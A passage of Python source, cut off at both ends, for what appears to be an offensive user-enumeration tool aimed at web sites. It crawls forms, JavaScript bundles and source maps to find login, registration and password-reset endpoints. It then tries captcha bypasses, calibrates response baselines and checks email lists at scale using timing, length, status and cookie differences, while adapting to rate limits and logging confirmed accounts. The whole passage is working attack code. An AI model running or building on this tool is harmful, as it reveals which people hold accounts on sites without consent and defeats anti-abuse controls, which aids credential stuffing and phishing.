                ep = self._build_endpoint_info(url, method, vector, resp)
                if ep:
                    return ep

        return None

    def _deep_probe_fallback(self):
        print(f"  {Fore.CYAN}[DEEP] Probing with real email payloads across common patterns{Style.RESET_ALL}")
        probe_email = f"deepprobe_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        targets = [self.target] + self.subdomains

        extra_paths = [
            ("/api/v1/auth/email", Vector.DIRECT_CHECK),
            ("/api/v1/users/email/check", Vector.DIRECT_CHECK),
            ("/api/v1/auth/check", Vector.DIRECT_CHECK),
            ("/api/auth/email/exists", Vector.DIRECT_CHECK),
            ("/api/check", Vector.DIRECT_CHECK),
            ("/api/v1/check", Vector.DIRECT_CHECK),
            ("/api/auth/login", Vector.LOGIN),
            ("/api/v1/auth/login", Vector.LOGIN),
            ("/api/v2/auth/login", Vector.LOGIN),
            ("/api/v3/auth/login", Vector.LOGIN),
            ("/api/auth/register", Vector.REGISTER),
            ("/api/v1/auth/register", Vector.REGISTER),
            ("/api/auth/forgot-password", Vector.PASSWORD_RESET),
            ("/api/v1/auth/forgot-password", Vector.PASSWORD_RESET),
            ("/api/v1/forgot-password", Vector.PASSWORD_RESET),
        ]

        email_params_try = ["email", "emailAddress", "mail", "username", "identifier", "login", "user_email", "account"]

        for base in targets:
            for path, vector in extra_paths:
                url = f"{base}{path}"
                for param in email_params_try[:4]:
                    for ct, kw in [
                        ("json", {"json": {param: probe_email}}),
                        ("form", {"data": {param: probe_email}}),
                    ]:
                        resp = self._request("POST", url, **kw)
                        if resp is None:
                            continue
                        if resp.status_code in (404, 410, 502, 503, 504):
                            break
                        if resp.status_code < 500:
                            body = resp.text.lower() if resp.text else ""
                            if self._is_soft_404(body, resp):
                                break
                            ep = EndpointInfo(
                                url=url, method="POST", vector=vector,
                                email_param=param,
                                content_type="application/json" if ct == "json" else "application/x-www-form-urlencoded",
                                status_code=resp.status_code,
                            )
                            waf = self.waf_detector.detect(resp)
                            if waf:
                                ep.waf = waf
                            self.discovered_endpoints.append(ep)
                            print(f"  {Fore.GREEN}[DEEP] Found: {url} (param={param}, ct={ct}, status={resp.status_code}){Style.RESET_ALL}")
                            break
                    else:
                        continue
                    break

    def _is_soft_404(self, body: str, resp: requests.Response) -> bool:
        soft_404_signals = [
            "page not found", "not found", "404",
            "does not exist", "no longer available",
            "this page doesn't exist", "nothing here",
            "the page you requested", "page you are looking for",
        ]
        ct = resp.headers.get("Content-Type", "").lower()
        if "application/json" in ct:
            try:
                j = resp.json()
                msg = str(j.get("message", j.get("error", j.get("msg", "")))).lower()
                if any(s in msg for s in ["not found", "404", "does not exist", "no route"]):
                    return True
            except Exception:
                pass
            return False
        if resp.status_code == 200 and len(body) > 500:
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', body)
            if title_match:
                title = title_match.group(1).lower()
                if any(s in title for s in soft_404_signals):
                    return True
        return False

    def _build_endpoint_info(self, url: str, method: str, vector: Vector,
                             resp: requests.Response) -> Optional[EndpointInfo]:
        ep = EndpointInfo(url=url, method=method, vector=vector, status_code=resp.status_code)

        waf = self.waf_detector.detect(resp)
        if waf:
            ep.waf = waf

        body = resp.text.lower() if resp.text else ""

        for name, pattern in [
            ("recaptcha", r"recaptcha|g-recaptcha|grecaptcha"),
            ("hcaptcha", r"hcaptcha|h-captcha"),
            ("turnstile", r"turnstile|cf-turnstile"),
            ("funcaptcha", r"funcaptcha|arkoselabs"),
            ("geetest", r"geetest|gt_captcha"),
        ]:
            if re.search(pattern, body):
                ep.captcha_enforced = True
                ep.captcha_type = name
                break
        if not ep.captcha_enforced and "captcha" in body:
            ep.captcha_enforced = True
            ep.captcha_type = "unknown"

        if HAS_BS4 and resp.text:
            soup = BeautifulSoup(resp.text, "html.parser")
            csrf = soup.find("input", {"name": re.compile(
                r'csrf|_token|authenticity|__RequestVerificationToken|_csrf_token|csrfmiddlewaretoken', re.I)})
            if csrf:
                ep.requires_csrf = True
                ep.csrf_field = csrf.get("name", "")
                ep.csrf_token = csrf.get("value", "")
            if not csrf:
                meta = soup.find("meta", {"name": re.compile(r'csrf-token|_csrf', re.I)})
                if meta:
                    ep.requires_csrf = True
                    ep.csrf_field = "X-CSRF-Token"
                    ep.csrf_token = meta.get("content", "")

        ct = resp.headers.get("Content-Type", "")
        if "application/json" in ct:
            ep.content_type = "application/json"
        elif "text/html" in ct:
            ep.content_type = "application/x-www-form-urlencoded"
        elif "application/xml" in ct or "text/xml" in ct:
            ep.content_type = "application/xml"

        if method == "OPTIONS":
            allow = resp.headers.get("Allow", "")
            ep.alt_methods = [m.strip() for m in allow.split(",") if m.strip()]

        ep.response_headers = dict(resp.headers)

        if resp.status_code == 405:
            allow = resp.headers.get("Allow", "")
            if allow:
                ep.alt_methods = [m.strip() for m in allow.split(",") if m.strip()]
                if "POST" in ep.alt_methods:
                    ep.method = "POST"
                elif "PUT" in ep.alt_methods:
                    ep.method = "PUT"

        return ep

    def _crawl_forms(self) -> list[EndpointInfo]:
        results = []
        if not HAS_BS4:
            return results
        seed_pages = [
            "/", "/login", "/register", "/signup", "/forgot-password",
            "/sign-in", "/sign-up", "/join", "/create-account",
            "/account/login", "/account/register", "/account/signup",
            "/auth/login", "/auth/register", "/auth/signup",
            "/auth/forgot-password", "/auth/sign-in", "/auth/sign-up",
            "/user/login", "/user/register", "/member/login",
            "/customer/login", "/exchange/login", "/signin",
            "/password/reset", "/forgot", "/recover",
            "/account", "/profile", "/settings",
        ]
        visited = set()
        to_visit = list(seed_pages)

        while to_visit and len(visited) < 50:
            path = to_visit.pop(0)
            if path in visited:
                continue
            visited.add(path)

            url = f"{self.target}{path}" if not path.startswith("http") else path
            resp = self._request("GET", url)
            if resp is None:
                continue
            if resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get("Location", "")
                if loc:
                    resolved = loc if loc.startswith("http") else urllib.parse.urljoin(self.target, loc)
                    if resolved.startswith(self.target):
                        rel = resolved[len(self.target):]
                        if rel and rel not in visited:
                            to_visit.append(rel)
                continue
            if resp.status_code >= 400:
                continue

            soup = BeautifulSoup(resp.text, "html.parser")

            if len(visited) < 30:
                for a in soup.find_all("a", href=True):
                    href = a["href"]
                    if not href.startswith("http"):
                        href = urllib.parse.urljoin(url, href)
                    if href.startswith(self.target):
                        rel = href[len(self.target):]
                        rel = rel.split("?")[0].split("#")[0]
                        lower_rel = rel.lower()
                        if any(kw in lower_rel for kw in (
                            "login", "signin", "signup", "register", "forgot",
                            "reset", "password", "auth", "account", "join",
                            "sign-in", "sign-up", "create", "recover", "verify",
                        )):
                            if rel not in visited:
                                to_visit.append(rel)

            for form in soup.find_all("form"):
                action = form.get("action", path)
                method = form.get("method", "POST").upper()
                if not action.startswith("http"):
                    action = urllib.parse.urljoin(self.target, action)
                inputs = form.find_all("input")
                email_field = None
                has_password = False
                for inp in inputs:
                    name = (inp.get("name") or "").lower()
                    itype = (inp.get("type") or "").lower()
                    placeholder = (inp.get("placeholder") or "").lower()
                    if itype == "email" or name in [p.lower() for p in EMAIL_PARAMS]:
                        email_field = inp.get("name", "email")
                    elif "email" in placeholder or "e-mail" in placeholder:
                        email_field = inp.get("name", "email")
                    elif itype == "text" and name in ("identifier", "login", "username", "user"):
                        email_field = inp.get("name", "email")
                    if itype == "password" or name in [p.lower() for p in PASS_PARAMS]:
                        has_password = True

                if email_field:
                    lower_action = action.lower()
                    if any(kw in lower_action for kw in ("forgot", "reset", "recover", "password/email")):
                        vector = Vector.PASSWORD_RESET
                    elif any(kw in lower_action for kw in ("register", "signup", "sign-up", "join", "create")):
                        vector = Vector.REGISTER
                    elif has_password:
                        vector = Vector.LOGIN
                    elif any(kw in lower_action for kw in ("check", "verify", "validate", "exists")):
                        vector = Vector.DIRECT_CHECK
                    else:
                        vector = Vector.REGISTER
                    ep = EndpointInfo(
                        url=action, method=method, vector=vector,
                        email_param=email_field,
                        content_type="application/x-www-form-urlencoded",
                    )
                    csrf = form.find("input", {"name": re.compile(
                        r'csrf|_token|authenticity|csrfmiddlewaretoken|__RequestVerificationToken', re.I)})
                    if csrf:
                        ep.requires_csrf = True
                        ep.csrf_field = csrf.get("name", "")
                        ep.csrf_token = csrf.get("value", "")
                    results.append(ep)

        if results:
            print(f"  {Fore.GREEN}[CRAWL] Found {len(results)} forms with email fields{Style.RESET_ALL}")
        return results

    def _extract_js_endpoints(self) -> list[EndpointInfo]:
        results = []
        resp = self._request("GET", self.target)
        if resp is None:
            return results

        body = resp.text or ""
        scripts_src = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', body)
        chunk_scripts = re.findall(
            r'["\'](/(?:static|_next|assets|chunks?|build|bundles?|js|dist|pack)/[^"\']+\.js)["\']', body)
        all_scripts = list(set(scripts_src + chunk_scripts))

        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)

        api_patterns = [
            re.compile(r'["\'](/(?:api|auth|v\d|graphql|users?|account|login|register|signup|forgot|reset|password|billing|payment|otp|sso|oauth|identity|session|token|connect|verify|check|validate|email|member|customer|onboarding|exchange|trade|internal|web|app)[a-zA-Z0-9/_-]*)["\']', re.I),
            re.compile(r'["\'](https?://[^"\']*?/(?:api|auth|v\d|graphql|users?|account|login|register|signup|forgot|reset|password|otp|sso|oauth|identity|session|verify|check|validate|email)[a-zA-Z0-9/_-]*)["\']', re.I),
            re.compile(r'(?:fetch|axios|ajax|XMLHttpRequest|\.(?:get|post|put|patch|delete))\s*\(\s*["\']([^"\']+)["\']', re.I),
            re.compile(r'(?:baseURL|apiUrl|API_URL|apiBase|API_BASE|endpoint|ENDPOINT)\s*[:=]\s*["\']([^"\']+)["\']', re.I),
            re.compile(r'(?:url|href|action|path|route)\s*[:=]\s*["\'](/[a-zA-Z0-9/_-]+)["\']', re.I),
        ]

        vector_map = {
            Vector.LOGIN: ["login", "signin", "auth/sign", "session", "authenticate", "credentials", "auth/local", "auth/email"],
            Vector.REGISTER: ["register", "signup", "sign-up", "create-account", "onboarding", "join"],
            Vector.PASSWORD_RESET: ["forgot", "reset", "recover", "password/email", "password/reset"],
            Vector.DIRECT_CHECK: ["check", "exists", "validate", "verify", "availability", "lookup", "email-check", "check-email"],
            Vector.OTP: ["otp", "2fa", "mfa", "send-code", "verification/send", "code/send"],
            Vector.BILLING: ["billing", "payment", "invoice", "subscription", "stripe", "checkout"],
            Vector.OAUTH: ["oauth", "authorize", "token", "connect/token", "openid"],
            Vector.SSO: ["sso", "saml"],
        }

        seen_urls = set()

        def _classify_and_add(match_url: str):
            if match_url in seen_urls:
                return
            lower = match_url.lower()
            if any(ext in lower for ext in [".js", ".css", ".png", ".jpg", ".svg", ".ico", ".woff", ".ttf", ".map"]):
                return
            if not match_url.startswith("http"):
                match_url = urllib.parse.urljoin(self.target, match_url)
            parsed = urllib.parse.urlparse(match_url)
            target_parsed = urllib.parse.urlparse(self.target)
            if parsed.hostname and parsed.hostname != target_parsed.hostname:
                if not parsed.hostname.endswith(target_parsed.hostname.split(".")[-2] + "." + target_parsed.hostname.split(".")[-1]):
                    return
            seen_urls.add(match_url)
            vector = Vector.UNKNOWN
            for v, keywords in vector_map.items():
                if any(kw in lower for kw in keywords):
                    vector = v
                    break
            if vector == Vector.UNKNOWN and not any(kw in lower for kw in
                    ("api", "auth", "user", "account", "login", "register", "signup",
                     "forgot", "reset", "password", "email", "verify", "check",
                     "otp", "mfa", "session", "token", "identity", "profile")):
                return
            results.append(EndpointInfo(url=match_url, vector=vector))

        for inline in inline_scripts:
            if len(inline) < 10:
                continue
            for pattern in api_patterns:
                for m in pattern.findall(inline):
                    _classify_and_add(m)

        for script_src in all_scripts[:40]:
            if not script_src.startswith("http"):
                script_src = urllib.parse.urljoin(self.target, script_src)
            js_resp = self._request("GET", script_src)
            if js_resp is None or len(js_resp.text or "") < 50:
                continue
            js_text = js_resp.text
            for pattern in api_patterns:
                for m in pattern.findall(js_text):
                    _classify_and_add(m)

            map_url = script_src + ".map"
            if self.deep:
                map_resp = self._request("GET", map_url)
                if map_resp and map_resp.status_code == 200:
                    try:
                        sm = map_resp.json()
                        sources = sm.get("sources", [])
                        auth_sources = [s for s in sources if any(kw in s.lower() for kw in
                                        ("auth", "login", "register", "signup", "forgot", "reset",
                                         "password", "user", "account", "api", "session", "token",
                                         "email", "verify", "otp"))]
                        if auth_sources:
                            print(f"  {Fore.GREEN}[SOURCEMAP] {len(auth_sources)} auth-related source files found{Style.RESET_ALL}")
                            for s in auth_sources[:10]:
                                print(f"    {s}")
                        content = sm.get("sourcesContent", [])
                        for sc in content:
                            if sc and isinstance(sc, str):
                                for pattern in api_patterns[:2]:
                                    for m in pattern.findall(sc):
                                        _classify_and_add(m)
                    except Exception:
                        pass

        if results:
            print(f"  {Fore.GREEN}[JS] Extracted {len(results)} endpoints from JavaScript/SPA{Style.RESET_ALL}")
        return results

    # == Phase 2: Pre-Enumeration ==

    def test_captcha_bypasses(self):
        captcha_eps = [ep for ep in self.discovered_endpoints if ep.captcha_enforced]
        if not captcha_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 2a: Captcha Bypass Testing ({len(captcha_eps)} endpoints){Style.RESET_ALL}")
        for ep in captcha_eps:
            bypassed = False
            fake_email = f"captchatest_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
            bypass_tests = [
                ("empty_params", {"captcha": "", "g-recaptcha-response": "", "h-captcha-response": "", "cf-turnstile-response": ""}),
                ("removed_params", {}),
                ("null_values", {"captcha": None, "g-recaptcha-response": None}),
                ("mobile_ua", {}),
                ("api_endpoint", {}),
            ]
            for name, extra in bypass_tests:
                if name == "mobile_ua":
                    old_mobile = self.mobile
                    self.mobile = True
                if name == "api_endpoint":
                    api_url = ep.url.replace("/login", "/api/login").replace("/register", "/api/register")
                    if api_url != ep.url:
                        test_ep = EndpointInfo(
                            url=api_url, method=ep.method, vector=ep.vector,
                            email_param=ep.email_param, content_type="application/json",
                        )
                        resp, _ = self._send_enum_request(test_ep, fake_email, extra_params=extra)
                    else:
                        resp = None
                else:
                    resp, _ = self._send_enum_request(ep, fake_email, extra_params=extra)
                if name == "mobile_ua":
                    self.mobile = old_mobile
                if resp and resp.status_code not in (403, 401, 429):
                    body = resp.text.lower()
                    if not any(kw in body for kw in ("captcha", "robot", "verify you", "challenge")):
                        bypassed = True
                        print(f"  {Fore.GREEN}[BYPASS] {ep.url} -- method: {name}{Style.RESET_ALL}")
                        ep.captcha_enforced = False
                        break
            if not bypassed:
                print(f"  {Fore.YELLOW}[LOCKED] {ep.url} -- captcha enforced ({ep.captcha_type}){Style.RESET_ALL}")

    def detect_catchall(self):
        if not self.full:
            return
        print(f"\n{Fore.CYAN}[*] Phase 2b: Catch-All Detection{Style.RESET_ALL}")
        active = [ep for ep in self.discovered_endpoints if not ep.captcha_enforced]
        if not active:
            return
        detector = CatchAllDetector(self.target, self._request)
        self.catchall_detected = detector.detect(active)
        if self.catchall_detected:
            print(f"  {Fore.YELLOW}[WARN] Target appears to be a catch-all (accepts all emails){Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}       Results may contain false positives{Style.RESET_ALL}")
        else:
            print(f"  {Fore.GREEN}[OK] No catch-all behavior detected{Style.RESET_ALL}")

    def detect_side_effects(self):
        if not self.full:
            return
        reg_eps = [ep for ep in self.discovered_endpoints
                   if ep.vector == Vector.REGISTER and not ep.captcha_enforced]
        if not reg_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 2c: Registration Side-Effect Detection{Style.RESET_ALL}")
        detector = RegistrationSideEffectDetector(self._request)
        for ep in reg_eps[:2]:
            result = detector.test(ep)
            self.side_effects[ep.url] = result
            if result.get("creates_account"):
                print(f"  {Fore.YELLOW}[WARN] {ep.url} CREATES real accounts on registration{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}       Skipping registration vector to avoid side effects{Style.RESET_ALL}")
                ep.captcha_enforced = True
            elif result.get("sends_email"):
                print(f"  {Fore.YELLOW}[INFO] {ep.url} sends verification emails{Style.RESET_ALL}")
            else:
                print(f"  {Fore.GREEN}[OK] {ep.url} no harmful side effects{Style.RESET_ALL}")

    # == Phase 3: Calibration ==

    def calibrate_baselines(self):
        print(f"\n{Fore.CYAN}[*] Phase 3: Baseline Calibration{Style.RESET_ALL}")
        domains = [
            f"{hashlib.md5(os.urandom(8)).hexdigest()[:12]}.example.com",
            f"{hashlib.md5(os.urandom(8)).hexdigest()[:12]}.test.invalid",
            f"{hashlib.md5(os.urandom(8)).hexdigest()[:12]}.invalid.test",
        ]
        baseline_emails = []
        for dom in domains:
            for prefix in ["nonexist", "fakefake", "noaccount", "testnoone", "randomxyz"]:
                baseline_emails.append(f"{prefix}_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@{dom}")

        active_endpoints = [ep for ep in self.discovered_endpoints if not ep.captcha_enforced]
        for ep in active_endpoints:
            timings, lengths, statuses = [], [], []
            body_hashes, bodies = [], []
            header_keys_set: set[str] = set()
            cookie_keys_set: set[str] = set()
            redirect_urls, content_types = [], []
            x_runtimes: list[float] = []

            sample_count = 8 if (self.deep or self.full) else 5
            for email in baseline_emails[:sample_count]:
                resp, elapsed = self._send_enum_request(ep, email)
                if resp is None:
                    continue
                timings.append(elapsed)
                lengths.append(len(resp.text))
                statuses.append(resp.status_code)
                body_hash = hashlib.md5(resp.text.encode()).hexdigest()
                body_hashes.append(body_hash)
                bodies.append(resp.text)
                header_keys_set.update(resp.headers.keys())
                cookie_keys_set.update(resp.cookies.keys())
                if resp.is_redirect:
                    redirect_urls.append(resp.headers.get("Location", ""))
                content_types.append(resp.headers.get("Content-Type", ""))
                xr = resp.headers.get("X-Runtime")
                if xr:
                    try:
                        x_runtimes.append(float(xr))
                    except ValueError:
                        pass
                self.rate_handler.wait(ep.url)

            if len(timings) >= 3:
                bl = Baseline(
                    avg_time=statistics.mean(timings),
                    std_time=statistics.stdev(timings) if len(timings) > 1 else 0.05,
                    min_time=min(timings),
                    max_time=max(timings),
                    avg_length=statistics.mean(lengths),
                    std_length=statistics.stdev(lengths) if len(lengths) > 1 else 5.0,
                    statuses=statuses,
                    body_hashes=body_hashes,
                    bodies=bodies,
                    header_keys=header_keys_set,
                    cookie_keys=cookie_keys_set,
                    redirect_urls=redirect_urls,
                    content_types=content_types,
                )
                if x_runtimes:
                    bl.x_runtime_avg = statistics.mean(x_runtimes)
                    bl.x_runtime_std = statistics.stdev(x_runtimes) if len(x_runtimes) > 1 else 0.01
                self.baselines[ep.url] = bl

                if self.verbose:
                    print(f"  {ep.url}: time={bl.avg_time:.3f}s+/-{bl.std_time:.3f} len={bl.avg_length:.0f}+/-{bl.std_length:.0f} status={Counter(statuses).most_common(1)[0]}")

        print(f"  {Fore.GREEN}[+] Baselines for {len(self.baselines)}/{len(active_endpoints)} endpoints{Style.RESET_ALL}")

    # == Phase 4: Enumeration ==

    def enumerate(self, emails: list[str]):
        active = [ep for ep in self.discovered_endpoints if ep.url in self.baselines]
        if not active:
            print(f"\n{Fore.RED}[!] No calibrated endpoints -- cannot enumerate{Style.RESET_ALL}")
            return

        checks_total = len(emails) * len(active)
        print(f"\n{Fore.CYAN}[*] Phase 4: Enumerating {len(emails)} email(s) x {len(active)} endpoint(s) = {checks_total} checks{Style.RESET_ALL}")

        tasks = [(email, ep) for email, ep in itertools.product(emails, active)
                 if not self.checkpoint.is_done(email, ep.url)]
        completed = 0
        start_time = time.time()
        rate_limit_count = 0
        unverified_hits: dict[str, list[EnumResult]] = defaultdict(list)

        adaptive_threads = self.threads
        max_threads = min(self.threads * 4, 40)

        with ThreadPoolExecutor(max_workers=max_threads) as pool:
            batch_size = adaptive_threads
            for batch_start in range(0, len(tasks), batch_size):
                batch = tasks[batch_start:batch_start + batch_size]
                futures = {}
                for email, ep in batch:
                    future = pool.submit(self._check_email, email, ep)
                    futures[future] = (email, ep)

                for future in as_completed(futures):
                    completed += 1
                    email_done, ep_done = futures[future]
                    result = future.result()
                    self.checkpoint.mark_done(email_done, ep_done.url)

                    if result and result.exists is True:
                        unverified_hits[email_done].append(result)
                        marker = self._marker(result.confidence)
                        evid = "; ".join(result.evidence[:3])
                        print(f"  {marker} {result.email} [{result.vector}] -- {evid}")
                        self._instant_report_hit(result)
                    elif result and result.exists is False and self.verbose:
                        print(f"  {Fore.GREEN}[x]{Style.RESET_ALL} {result.email} [{result.vector}]")

                    if completed % 25 == 0:
                        elapsed = time.time() - start_time
                        cpm = (completed / elapsed) * 60 if elapsed > 0 else 0
                        hits = sum(len(v) for v in unverified_hits.values())
                        print(f"  {Fore.WHITE}[PROGRESS] {completed}/{len(tasks)} | {cpm:.0f} checks/min | {hits} hits{Style.RESET_ALL}")
                        self.checkpoint.save(self.results)

                    self.rate_handler.wait(ep_done.url)

                rl_now = self.rate_handler.total_429
                if rl_now > rate_limit_count:
                    rate_limit_count = rl_now
                    adaptive_threads = max(2, adaptive_threads - 1)
                elif adaptive_threads < max_threads and rate_limit_count == rl_now:
                    adaptive_threads = min(adaptive_threads + 1, max_threads)
                batch_size = adaptive_threads

        if self.no_verify:
            for email, hits in unverified_hits.items():
                best = max(hits, key=lambda r: self._conf_rank(r.confidence))
                if len(hits) > 1:
                    best.confidence = Confidence.CONFIRMED
                    best.evidence.insert(0, f"cross-confirmed on {len(hits)} endpoints")
                self.results.append(best)
            verified_count = sum(len(v) for v in unverified_hits.values())
        else:
            print(f"\n{Fore.CYAN}[*] Phase 4b: Verification Re-check{Style.RESET_ALL}")
            verified_count = 0
            for email, hits in unverified_hits.items():
                best = max(hits, key=lambda r: self._conf_rank(r.confidence))
                ep_match = next((ep for ep in active if ep.url == best.endpoint), None)
                if ep_match is None:
                    self.results.append(best)
                    verified_count += 1
                    continue

                verified = self._verify_hit(email, ep_match, best)
                if verified:
                    if len(hits) > 1:
                        verified.confidence = Confidence.CONFIRMED
                        verified.evidence.insert(0, f"cross-verified on {len(hits)} endpoints")
                    self.results.append(verified)
                    verified_count += 1
                    print(f"  {Fore.GREEN}[VERIFIED]{Style.RESET_ALL} {email} [{verified.confidence.value}]")
                else:
                    best.confidence = Confidence.LOW
                    best.evidence.insert(0, "failed verification re-check")
                    self.results.append(best)
                    print(f"  {Fore.YELLOW}[UNVERIFIED]{Style.RESET_ALL} {email} -- downgraded to LOW")

        elapsed_total = time.time() - start_time
        cpm_final = (completed / elapsed_total) * 60 if elapsed_total > 0 else 0
        print(f"\n  {Fore.GREEN}[+] {completed} checks in {elapsed_total:.1f}s ({cpm_final:.0f}/min), {verified_count} verified hits{Style.RESET_ALL}")
        self.checkpoint.save(self.results)

    def _verify_hit(self, email: str, ep: EndpointInfo, original: EnumResult) -> Optional[EnumResult]:
        time.sleep(random.uniform(1.0, 3.0))
        resp, elapsed = self._send_enum_request(ep, email)
        if resp is None:
            return None
        baseline = self.baselines.get(ep.url)
        if not baseline:
            return None

        body = resp.text.lower()
        confirmed = False
        evidence = []

        for sig in EXISTING_SIGNALS:
            if sig in body:
                confirmed = True
                evidence.append(f"verify: '{sig}' in response")
                break

        try:
            jdata = resp.json() if resp.text.strip() else {}
            if isinstance(jdata, dict):
                for key, val in jdata.items():
                    kl = key.lower()
                    if kl in ("exists", "found", "registered", "taken", "is_registered"):
                        if val is True:
                            confirmed = True
                            evidence.append(f"verify: json {key}=true")
                    if kl in ("available",):
                        if val is False:
                            confirmed = True
                            evidence.append(f"verify: json {key}=false (taken)")
        except (json.JSONDecodeError, ValueError):
            pass

        if resp.status_code == original.status_code and resp.status_code not in baseline.statuses:
            confirmed = True
            evidence.append(f"verify: consistent status {resp.status_code}")

        len_diff = abs(len(resp.text) - baseline.avg_length)
        orig_diff = abs(original.content_length - baseline.avg_length)
        if len_diff > max(baseline.std_length * 2, 15) and abs(len_diff - orig_diff) < 50:
            confirmed = True
            evidence.append(f"verify: consistent length divergence d{len_diff:.0f}")

        if not confirmed:
            return None

        result = EnumResult(
            email=email, vector=ep.vector.value, endpoint=ep.url,
            status_code=resp.status_code, response_time=elapsed,
            content_length=len(resp.text), exists=True,
            confidence=Confidence.HIGH,
            evidence=evidence + original.evidence,
            response_headers=dict(resp.headers),
            cookies=dict(resp.cookies),
            raw_body_hash=hashlib.md5(resp.text.encode()).hexdigest(),
        )
        return result

    def _instant_report_hit(self, result: EnumResult):
        domain = urllib.parse.urlparse(self.target).hostname or "target"
        live_file = f"enum_live_{domain}.jsonl"
        try:
            with open(live_file, "a") as f:
                f.write(json.dumps({
                    "email": result.email,
                    "exists": result.exists,
                    "confidence": result.confidence.value if result.confidence else "unknown",
                    "vector": result.vector,
                    "endpoint": result.endpoint,
                    "evidence": result.evidence[:5],
                    "status": result.status_code,
                    "time": result.response_time,
                    "timestamp": datetime.now().isoformat(),
                }) + "\n")
        except Exception:
            pass

    def _check_email(self, email: str, ep: EndpointInfo) -> Optional[EnumResult]:
        if not self.lockout_detector.is_safe(ep.url):
            return None
        resp, elapsed = self._send_enum_request(ep, email)

        if resp is not None and resp.status_code in (400, 422) and ep.email_param == "email":
            alt_params = ["emailAddress", "username", "identifier", "mail", "login", "user_email", "account"]
            for alt in alt_params:
                if alt == ep.email_param:
                    continue
                old_param = ep.email_param
                ep.email_param = alt
                resp2, elapsed2 = self._send_enum_request(ep, email)
                if resp2 and resp2.status_code not in (400, 422):
                    resp, elapsed = resp2, elapsed2
                    break
                ep.email_param = old_param

        if resp is None:
            return None
        self.lockout_detector.record(ep.url, resp)
        baseline = self.baselines.get(ep.url)
        if not baseline:
            return None

        result = EnumResult(
            email=email, vector=ep.vector.value, endpoint=ep.url,
            status_code=resp.status_code, response_time=elapsed,
            content_length=len(resp.text),
            response_headers=dict(resp.headers),
            cookies=dict(resp.cookies),
            raw_body_hash=hashlib.md5(resp.text.encode()).hexdigest(),
        )
        if resp.is_redirect:
            result.redirect_url = resp.headers.get("Location", "")

        signals: list[tuple[str, float, str]] = []
        body = resp.text.lower()

        # Signal 1: Status code divergence
        if resp.status_code not in baseline.statuses:
            weight = 0.7 if resp.status_code in (200, 302, 401, 403, 422, 409) else 0.4
            signals.append(("status", weight, f"status {resp.status_code} vs baseline {Counter(baseline.statuses).most_common(1)[0][0]}"))

        # Signal 2: Content length divergence
        len_diff = abs(len(resp.text) - baseline.avg_length)
        len_threshold = max(baseline.std_length * 2, 15)
        if len_diff > len_threshold:
            weight = min(0.8, len_diff / 300)
            signals.append(("length", weight, f"length d{len_diff:.0f} (baseline {baseline.avg_length:.0f}+/-{baseline.std_length:.0f})"))

        # Signal 3: Timing divergence
        time_diff = elapsed - baseline.avg_time
        time_threshold = max(baseline.std_time * 3, 0.2)
        if time_diff > time_threshold:
            weight = min(0.6, time_diff / 2.0)
            signals.append(("timing", weight, f"time {elapsed:.3f}s vs {baseline.avg_time:.3f}s (d{time_diff:.3f}s)"))

        # Signal 4: Body text signals
        for sig in EXISTING_SIGNALS:
            if sig in body:
                signals.append(("body_text", 0.92, f"'{sig}' in response"))
                break

        is_not_found = any(sig in body for sig in NOT_FOUND_SIGNALS)

        # Signal 5: JSON field analysis
        try:
            jdata = resp.json() if resp.text.strip() else {}
            if isinstance(jdata, dict):
                self._analyze_json(jdata, signals, "")
        except (json.JSONDecodeError, ValueError):
            pass

        # Signal 6: Body hash divergence
        body_hash = hashlib.md5(resp.text.encode()).hexdigest()
        if body_hash not in baseline.body_hashes:
            ratio = self._body_similarity(resp.text, baseline.bodies[0] if baseline.bodies else "")
            if ratio < 0.80:
                signals.append(("body_diff", 0.5, f"body similarity {ratio:.2f}"))

        # Signal 7: Header divergence
        resp_header_keys = set(resp.headers.keys())
        new_headers = resp_header_keys - baseline.header_keys
        interesting_new = [h for h in new_headers if h.lower() not in ("date", "age", "x-request-id", "x-trace-id")]
        if interesting_new:
            signals.append(("headers", 0.4, f"new headers: {', '.join(interesting_new[:3])}"))

        # Signal 8: Cookie divergence
        resp_cookie_keys = set(resp.cookies.keys())
        new_cookies = resp_cookie_keys - baseline.cookie_keys
        if new_cookies:
            signals.append(("cookies", 0.5, f"new cookies: {', '.join(new_cookies)}"))

        # Signal 9: Redirect divergence
        if resp.is_redirect:
            loc = resp.headers.get("Location", "")
            if not baseline.redirect_urls or loc not in baseline.redirect_urls:
                if any(kw in loc.lower() for kw in ("dashboard", "home", "profile", "account", "2fa", "verify", "otp")):
                    signals.append(("redirect", 0.8, f"redirect to {loc}"))
                else:
                    signals.append(("redirect", 0.4, f"different redirect: {loc}"))

        # Signal 10: Auth cookie
        set_cookie = resp.headers.get("Set-Cookie", "").lower()
        if any(kw in set_cookie for kw in ("session", "auth", "token", "jwt", "sid")):
            if not any(kw in "; ".join(baseline.content_types).lower() for kw in ("session", "auth", "token")):
                signals.append(("auth_cookie", 0.7, "auth/session cookie set"))

        # Signal 11: X-Runtime divergence
        xr = resp.headers.get("X-Runtime")
        if xr and baseline.x_runtime_avg > 0:
            try:
                xr_val = float(xr)
                xr_diff = xr_val - baseline.x_runtime_avg
                if xr_diff > max(baseline.x_runtime_std * 3, 0.05):
                    signals.append(("x_runtime", 0.6, f"X-Runtime {xr_val:.4f}s vs baseline {baseline.x_runtime_avg:.4f}s"))
            except ValueError:
                pass

        # Signal 12: Content-Type divergence
        ct = resp.headers.get("Content-Type", "")
        if ct and baseline.content_types and ct not in baseline.content_types:
            signals.append(("content_type", 0.3, f"Content-Type changed: {ct}"))

        # Signal 13: Response body structure change
        try:
            resp_json = resp.json() if resp.text.strip() else None
            if resp_json and baseline.bodies:
                try:
                    base_json = json.loads(baseline.bodies[0])
                    resp_keys = set(resp_json.keys()) if isinstance(resp_json, dict) else set()
                    base_keys = set(base_json.keys()) if isinstance(base_json, dict) else set()
                    new_keys = resp_keys - base_keys
                    if new_keys:
